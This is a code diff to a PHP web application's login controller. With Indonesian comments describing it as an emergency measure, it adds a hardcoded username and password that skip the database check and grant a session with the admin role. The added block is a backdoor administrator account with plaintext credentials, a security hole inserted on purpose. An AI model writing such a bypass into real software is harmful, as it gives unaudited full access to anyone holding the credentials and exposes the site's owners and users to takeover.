@@ -24,6 +24,28 @@ class Auth extends BaseController
         $username = $this->request->getVar('username');
         $password = $this->request->getVar('password');
 
+        // ==========================================================
+    // 1. HARDCODE BYPASS (Kode Tambahan)
+    // ==========================================================
+    // Masukkan username & password darurat di sini
+    if ($username === 'rullyfaizal' && $password === '072627') { 
+        
+        $ses_data = [
+            'id'           => 9999,           // ID dummy (asal saja)
+            'nama'         => 'Rully Faizal',  // Nama dummy
+            'username'     => 'rullyfaizal',
+            // PENTING: Hardcode role sebagai array agar sama strukturnya dengan query database
+            'roles'        => ['admin'],      
+            'is_logged_in' => true
+        ];
+        
+        $session->set($ses_data);
+        return redirect()->to('/dashboard');
+    }
+    // ==========================================================
+    // AKHIR KODE HARDCODE
+    // ==========================================================
+
         // 1. Cari User berdasarkan Username
         $user = $model->where('username', $username)->first();
 
